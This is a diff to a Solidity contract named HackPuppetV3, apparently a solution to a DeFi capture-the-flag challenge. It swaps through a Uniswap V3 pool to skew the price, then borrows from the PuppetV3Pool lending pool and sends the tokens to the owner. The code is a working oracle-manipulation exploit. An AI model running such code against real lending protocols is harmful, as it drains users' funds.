@@ -9,6 +9,7 @@ import { PuppetV3Pool } from "./PuppetV3Pool.sol";
 interface IERC20 {
     function approve(address spender, uint256 amount) external returns (bool);
     function transfer(address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
 }
 
 interface IWETH is IERC20 {
@@ -20,24 +21,31 @@ contract HackPuppetV3 is IUniswapV3SwapCallback {
     IWETH weth;
     IERC20 token;
     IUniswapV3Pool pool;
-    address manager;
-    uint256 fee;
+    PuppetV3Pool lendingPool;
+    address owner;
 
     constructor(
         IWETH _weth,
         IERC20 _token,
         IUniswapV3Pool _pool,
-        address _manager
+        PuppetV3Pool  _lendingPool
     ) {
+        owner = msg.sender;
         weth = _weth;
         token = _token;
         pool = _pool;
-        manager = _manager;
+        lendingPool = _lendingPool;
     }
 
-    function swap(uint256 amount, uint256 _fee, uint256 sqrt) public {
-        fee = _fee;
-        pool.swap(address(this), true, 1 ether, uint160(sqrt), "");
+    function swap(int256 amount, uint160 sqrt) public {
+        bytes memory encoded = abi.encode(address(token), address(pool));
+        pool.swap(address(this), false, amount, sqrt, encoded);
+    }
+
+    function borrowAndTransfer(uint256 borrow) public {
+        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
+        lendingPool.borrow(borrow);
+        token.transfer(owner, token.balanceOf(address(this)));
     }
 
     function uniswapV3SwapCallback(
@@ -45,8 +53,8 @@ contract HackPuppetV3 is IUniswapV3SwapCallback {
         int256 amount1Delta,
         bytes calldata data
     ) external override {
-        weth.transfer(address(pool), uint256(amount1Delta));
-        payable(address(pool)).transfer(fee);
+        (address _token, address _pool) = abi.decode(data, (address, address));
+        IERC20(_token).transfer(_pool, uint256(amount1Delta));
     }
 
     fallback() external payable {}
